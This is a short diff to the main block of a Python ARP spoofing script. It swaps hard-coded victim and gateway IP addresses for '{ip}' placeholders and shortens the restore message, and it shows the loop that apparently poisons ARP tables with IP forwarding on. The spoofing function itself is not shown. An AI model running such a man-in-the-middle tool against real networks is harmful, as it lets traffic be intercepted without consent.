@@ -66,9 +66,9 @@ def restore(target_ip, host_ip, verbose=True):
 
 if __name__ == "__main__":
     # victim ip address
-    target = "192.168.1.100"
+    target = "{ip}" # TODO: Fill
     # gateway ip address
-    host = "192.168.1.1"
+    host = "{ip}" # TODO: Fill
     # print progress to the screen
     verbose = True
     # enable ip forwarding
@@ -82,6 +82,6 @@ if __name__ == "__main__":
             # sleep for one second
             time.sleep(1)
     except KeyboardInterrupt:
-        print("[!] Detected CTRL+C ! restoring the network, please wait...")
+        print("[!] Restoring the network")
         restore(target, host)
         restore(host, target)
